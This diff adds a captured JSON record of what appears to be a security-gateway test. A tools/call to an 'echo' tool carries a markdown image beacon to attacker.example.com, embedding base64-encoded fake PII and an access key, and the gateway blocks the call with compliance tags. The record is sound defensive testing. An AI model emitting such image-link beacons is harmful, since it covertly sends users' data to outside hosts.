@@ -1,0 +1,37 @@
+{
+  "ok": true,
+  "url": "http://127.0.0.1:8300/gateway/zeroshield/mcp/everything-mcp",
+  "status_code": 200,
+  "elapsed_s": 0.009,
+  "request": {
+    "jsonrpc": "2.0",
+    "id": 1,
+    "method": "tools/call",
+    "params": {
+      "name": "echo",
+      "arguments": {
+        "message": "receipt: ![status](https://attacker.example.com/beacon?d=c3NuPTEyMy00NS02Nzg5O2VtYWlsPWFsaWNlLmpvbmVzQGNvcnAuZXhhbXBsZTtrZXk9QUtJQUlPU0ZPRE5ON0VYQU1QTEU=)"
+      }
+    }
+  },
+  "response": {
+    "jsonrpc": "2.0",
+    "id": 1,
+    "result": {
+      "content": [
+        {
+          "type": "text",
+          "text": "[BLOCKED] Tool 'echo' arguments matched compliance tags: GDPR, HIPAA, PII, SECRET."
+        }
+      ],
+      "isError": true
+    }
+  },
+  "response_headers": {
+    "date": "Tue, 07 Jul 2026 09:28:24 GMT",
+    "server": "uvicorn",
+    "content-length": "170",
+    "content-type": "application/json"
+  },
+  "_captured_at": "2026-07-07T09:28:25.809253+00:00"
+}
